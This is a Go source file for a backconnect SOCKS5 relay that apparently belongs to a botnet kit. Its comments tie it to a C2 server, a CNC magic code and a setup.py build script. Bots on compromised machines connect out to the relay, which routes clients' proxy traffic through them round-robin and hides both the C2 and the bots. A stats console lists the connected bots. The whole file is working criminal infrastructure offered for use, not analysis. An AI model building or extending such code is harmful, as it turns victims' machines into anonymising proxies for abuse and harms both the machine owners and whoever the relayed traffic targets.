package main

import (
	"bufio"
	"crypto/ecdsa"
	"crypto/elliptic"
	"crypto/rand"
	"crypto/tls"
	"crypto/x509"
	"crypto/x509/pkix"
	"encoding/pem"
	"flag"
	"fmt"
	"io"
	"log"
	"math/big"
	"net"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

// ============================================================================
// BACKCONNECT SOCKS5 RELAY SERVER
//
// Sits between SOCKS5 clients and bots. Bots connect OUT to this relay
// (backconnect), so neither the C2 nor the bot exposes a listening port.
//
// Protocol:
//   Bot → Relay (TLS):  "RELAY_AUTH:<key>:<botID>\n"   → control channel
//   Relay → Bot:         "RELAY_OK\n"
//   Relay → Bot:         "RELAY_NEW:<sessionID>\n"      → new client waiting
//   Bot → Relay (TLS):  "RELAY_DATA:<sessionID>\n"     → data channel
//   Bot runs SOCKS5 protocol over the data channel.
//
// Usage:
//   ./relay -key <auth_key> [-cp 9001] [-sp 1080] [-stats 127.0.0.1:9090]
// ============================================================================

type bot struct {
	id        string
	ctrl      net.Conn
	mu        sync.Mutex // protects writes to ctrl
	addr      string     // remote address
	connectedAt time.Time
}

var (
	bots    = make(map[string]*bot)
	botsMu  sync.RWMutex
	botRR   int
	botRRMu sync.Mutex
)

var (
	pendingSessions   = make(map[string]chan net.Conn)
	pendingSessionsMu sync.Mutex
)

// ============================================================================
// CONFIG — patched by setup.py at build time
// ============================================================================

// defaultAuthKey is the auth key baked in at build time by setup.py.
// Must match bot syncToken / CNC MAGIC_CODE.
// Can be overridden at runtime with -key flag.
var defaultAuthKey = "ijAa5NmBx3E7HTOx" //change me run setup.py

// ============================================================================
// STATS — atomic counters for live monitoring
// ============================================================================

var (
	statTotalSessions   int64 // total SOCKS5 sessions served
	statActiveSessions  int64 // currently active sessions
	statTotalBytesUp    int64 // client → target (through bot)
	statTotalBytesDown  int64 // target → client (through bot)
	statFailedSessions  int64 // sessions that failed (no bot, timeout, etc)
	statTotalBots       int64 // total bot connections ever
	statAuthFailures    int64 // bad auth attempts
)

func main() {
	controlPort := flag.String("cp", "9001", "Control port for bot backconnect (TLS)")
	socksPort := flag.String("sp", "1080", "SOCKS5 port for proxy clients")
	authKey := flag.String("key", "", "Auth key override (default: built-in from setup.py)")
	certFile := flag.String("cert", "", "TLS certificate (auto-generated if empty)")
	keyFile := flag.String("keyfile", "", "TLS private key (auto-generated if empty)")
	statsAddr := flag.String("stats", "", "Stats endpoint (e.g. 127.0.0.1:9090) — plaintext CLI, off by default")
	flag.Parse()

	// Use -key flag if provided, otherwise fall back to built-in default
	key := *authKey
	if key == "" {
		key = defaultAuthKey
	}
	if key == "" {
		log.Fatal("[RELAY] No auth key — run setup.py or pass -key flag")
	}

	tlsCfg := buildTLSConfig(*certFile, *keyFile)

	if *statsAddr != "" {
		go statsListener(*statsAddr)
	}

	go controlListener(*controlPort, key, tlsCfg)

	socksListener(*socksPort)
}

// ============================================================================
// TLS
// ============================================================================

func buildTLSConfig(certFile, keyFile string) *tls.Config {
	if certFile != "" && keyFile != "" {
		cert, err := tls.LoadX509KeyPair(certFile, keyFile)
		if err != nil {
			log.Fatalf("[RELAY] TLS load failed: %v", err)
		}
		return &tls.Config{Certificates: []tls.Certificate{cert}, MinVersion: tls.VersionTLS12}
	}
	log.Println("[RELAY] No cert/key provided — generating ephemeral self-signed certificate")
	key, _ := ecdsa.GenerateKey(elliptic.P256(), rand.Reader)
	tmpl := &x509.Certificate{
		SerialNumber: big.NewInt(1),
		Subject:      pkix.Name{CommonName: "relay"},
		NotBefore:    time.Now(),
		NotAfter:     time.Now().Add(10 * 365 * 24 * time.Hour),
		KeyUsage:     x509.KeyUsageDigitalSignature,
		ExtKeyUsage:  []x509.ExtKeyUsage{x509.ExtKeyUsageServerAuth},
	}
	certDER, _ := x509.CreateCertificate(rand.Reader, tmpl, tmpl, &key.PublicKey, key)
	certPEM := pem.EncodeToMemory(&pem.Block{Type: "CERTIFICATE", Bytes: certDER})
	keyDER, _ := x509.MarshalECPrivateKey(key)
	keyPEM := pem.EncodeToMemory(&pem.Block{Type: "EC PRIVATE KEY", Bytes: keyDER})
	cert, _ := tls.X509KeyPair(certPEM, keyPEM)
	return &tls.Config{Certificates: []tls.Certificate{cert}, MinVersion: tls.VersionTLS12}
}

// ============================================================================
// CONTROL PORT — bots connect here
// ============================================================================

func controlListener(port, authKey string, tlsCfg *tls.Config) {
	ln, err := tls.Listen("tcp", "0.0.0.0:"+port, tlsCfg)
	if err != nil {
		log.Fatalf("[RELAY] Control listen failed on :%s: %v", port, err)
	}
	log.Printf("[RELAY] Control port :%s (TLS) — waiting for bots", port)
	for {
		conn, err := ln.Accept()
		if err != nil {
			continue
		}
		go handleIncoming(conn, authKey)
	}
}

func handleIncoming(conn net.Conn, authKey string) {
	reader := bufio.NewReader(conn)
	conn.SetReadDeadline(time.Now().Add(10 * time.Second))
	line, err := reader.ReadString('\n')
	if err != nil {
		conn.Close()
		return
	}
	line = strings.TrimSpace(line)

	// DATA channel — bot connecting back for a session
	if strings.HasPrefix(line, "RELAY_DATA:") {
		sessionID := strings.TrimPrefix(line, "RELAY_DATA:")
		conn.SetReadDeadline(time.Time{})
		deliverDataConn(sessionID, conn)
		return
	}

	// AUTH — new bot control connection
	if !strings.HasPrefix(line, "RELAY_AUTH:") {
		conn.Close()
		return
	}
	parts := strings.SplitN(strings.TrimPrefix(line, "RELAY_AUTH:"), ":", 2)
	if len(parts) != 2 || parts[0] != authKey {
		atomic.AddInt64(&statAuthFailures, 1)
		conn.Write([]byte("RELAY_FAIL\n"))
		conn.Close()
		return
	}
	botID := parts[1]
	conn.SetReadDeadline(time.Time{})
	conn.Write([]byte("RELAY_OK\n"))

	b := &bot{id: botID, ctrl: conn, addr: conn.RemoteAddr().String(), connectedAt: time.Now()}

	botsMu.Lock()
	if old, ok := bots[botID]; ok {
		old.ctrl.Close()
	}
	bots[botID] = b
	botsMu.Unlock()
	atomic.AddInt64(&statTotalBots, 1)
	log.Printf("[RELAY] Bot registered: %s (%s)", botID, conn.RemoteAddr())

	// Block here reading keepalive / detect disconnect
	buf := make([]byte, 256)
	for {
		conn.SetReadDeadline(time.Now().Add(5 * time.Minute))
		_, err := conn.Read(buf)
		if err != nil {
			break
		}
	}

	botsMu.Lock()
	if bots[botID] == b {
		delete(bots, botID)
	}
	botsMu.Unlock()
	conn.Close()
	log.Printf("[RELAY] Bot disconnected: %s", botID)
}

func deliverDataConn(sessionID string, conn net.Conn) {
	pendingSessionsMu.Lock()
	ch, exists := pendingSessions[sessionID]
	if exists {
		delete(pendingSessions, sessionID)
	}
	pendingSessionsMu.Unlock()

	if !exists {
		conn.Close()
		return
	}
	ch <- conn
}

// ============================================================================
// SOCKS5 PORT — proxy clients connect here
// ============================================================================

func socksListener(port string) {
	ln, err := net.Listen("tcp", "0.0.0.0:"+port)
	if err != nil {
		log.Fatalf("[RELAY] SOCKS listen failed on :%s: %v", port, err)
	}
	log.Printf("[RELAY] SOCKS5 port :%s — ready for clients", port)
	for {
		conn, err := ln.Accept()
		if err != nil {
			continue
		}
		go handleSocksClient(conn)
	}
}

func handleSocksClient(clientConn net.Conn) {
	b := pickBot()
	if b == nil {
		atomic.AddInt64(&statFailedSessions, 1)
		clientConn.Close()
		return
	}

	sessionID := fmt.Sprintf("%d", time.Now().UnixNano())

	ch := make(chan net.Conn, 1)
	pendingSessionsMu.Lock()
	pendingSessions[sessionID] = ch
	pendingSessionsMu.Unlock()

	// Signal bot to open a data connection
	b.mu.Lock()
	_, err := b.ctrl.Write([]byte("RELAY_NEW:" + sessionID + "\n"))
	b.mu.Unlock()
	if err != nil {
		atomic.AddInt64(&statFailedSessions, 1)
		pendingSessionsMu.Lock()
		delete(pendingSessions, sessionID)
		pendingSessionsMu.Unlock()
		clientConn.Close()
		return
	}

	// Wait for bot data connection
	select {
	case dataConn := <-ch:
		atomic.AddInt64(&statTotalSessions, 1)
		atomic.AddInt64(&statActiveSessions, 1)
		bridge(clientConn, dataConn)
		atomic.AddInt64(&statActiveSessions, -1)
	case <-time.After(15 * time.Second):
		atomic.AddInt64(&statFailedSessions, 1)
		pendingSessionsMu.Lock()
		delete(pendingSessions, sessionID)
		pendingSessionsMu.Unlock()
		clientConn.Close()
	}
}

func pickBot() *bot {
	botsMu.RLock()
	defer botsMu.RUnlock()
	if len(bots) == 0 {
		return nil
	}
	ids := make([]string, 0, len(bots))
	for id := range bots {
		ids = append(ids, id)
	}
	botRRMu.Lock()
	idx := botRR % len(ids)
	botRR++
	botRRMu.Unlock()
	return bots[ids[idx]]
}

// bridge relays data bidirectionally, tracking bandwidth stats.
func bridge(a, b net.Conn) {
	done := make(chan struct{}, 2)
	go func() {
		n, _ := io.Copy(a, b)
		atomic.AddInt64(&statTotalBytesDown, n)
		done <- struct{}{}
	}()
	go func() {
		n, _ := io.Copy(b, a)
		atomic.AddInt64(&statTotalBytesUp, n)
		done <- struct{}{}
	}()
	<-done
	a.Close()
	b.Close()
	<-done
}

// ============================================================================
// STATS ENDPOINT — optional plaintext CLI for live monitoring
//
// Connect with: nc 127.0.0.1 9090
// Shows a snapshot of relay state and closes. Non-interactive.
// Bind to 127.0.0.1 by default so it's not exposed externally.
// ============================================================================

func statsListener(addr string) {
	ln, err := net.Listen("tcp", addr)
	if err != nil {
		log.Printf("[RELAY] Stats listen failed on %s: %v (stats disabled)", addr, err)
		return
	}
	log.Printf("[RELAY] Stats endpoint on %s (nc %s)", addr, addr)
	for {
		conn, err := ln.Accept()
		if err != nil {
			continue
		}
		go handleStats(conn)
	}
}

func formatBytes(b int64) string {
	const (
		KB = 1024
		MB = KB * 1024
		GB = MB * 1024
	)
	switch {
	case b >= GB:
		return fmt.Sprintf("%.2f GB", float64(b)/float64(GB))
	case b >= MB:
		return fmt.Sprintf("%.2f MB", float64(b)/float64(MB))
	case b >= KB:
		return fmt.Sprintf("%.2f KB", float64(b)/float64(KB))
	default:
		return fmt.Sprintf("%d B", b)
	}
}

func handleStats(conn net.Conn) {
	defer conn.Close()
	w := bufio.NewWriter(conn)

	w.WriteString("╔══════════════════════════════════════════════╗\n")
	w.WriteString("║          RELAY STATUS                        ║\n")
	w.WriteString("╠══════════════════════════════════════════════╣\n")

	// Counters
	totalSess := atomic.LoadInt64(&statTotalSessions)
	activeSess := atomic.LoadInt64(&statActiveSessions)
	failedSess := atomic.LoadInt64(&statFailedSessions)
	bytesUp := atomic.LoadInt64(&statTotalBytesUp)
	bytesDown := atomic.LoadInt64(&statTotalBytesDown)
	totalBots := atomic.LoadInt64(&statTotalBots)
	authFails := atomic.LoadInt64(&statAuthFailures)

	w.WriteString(fmt.Sprintf("  Sessions total:    %d\n", totalSess))
	w.WriteString(fmt.Sprintf("  Sessions active:   %d\n", activeSess))
	w.WriteString(fmt.Sprintf("  Sessions failed:   %d\n", failedSess))
	w.WriteString(fmt.Sprintf("  Bandwidth up:      %s\n", formatBytes(bytesUp)))
	w.WriteString(fmt.Sprintf("  Bandwidth down:    %s\n", formatBytes(bytesDown)))
	w.WriteString(fmt.Sprintf("  Bandwidth total:   %s\n", formatBytes(bytesUp+bytesDown)))
	w.WriteString(fmt.Sprintf("  Bot connects:      %d\n", totalBots))
	w.WriteString(fmt.Sprintf("  Auth failures:     %d\n", authFails))

	w.WriteString("╠══════════════════════════════════════════════╣\n")
	w.WriteString("║          CONNECTED BOTS                      ║\n")
	w.WriteString("╠══════════════════════════════════════════════╣\n")

	botsMu.RLock()
	if len(bots) == 0 {
		w.WriteString("  (none)\n")
	} else {
		w.WriteString(fmt.Sprintf("  %-12s %-22s %s\n", "BOT ID", "REMOTE ADDR", "UPTIME"))
		w.WriteString("  " + strings.Repeat("─", 44) + "\n")
		for _, b := range bots {
			uptime := time.Since(b.connectedAt).Round(time.Second)
			w.WriteString(fmt.Sprintf("  %-12s %-22s %s\n", b.id, b.addr, uptime))
		}
	}
	botsMu.RUnlock()

	pendingSessionsMu.Lock()
	pending := len(pendingSessions)
	pendingSessionsMu.Unlock()

	w.WriteString("╠══════════════════════════════════════════════╣\n")
	w.WriteString(fmt.Sprintf("  Pending sessions:  %d\n", pending))
	w.WriteString("╚══════════════════════════════════════════════╝\n")

	w.Flush()
}
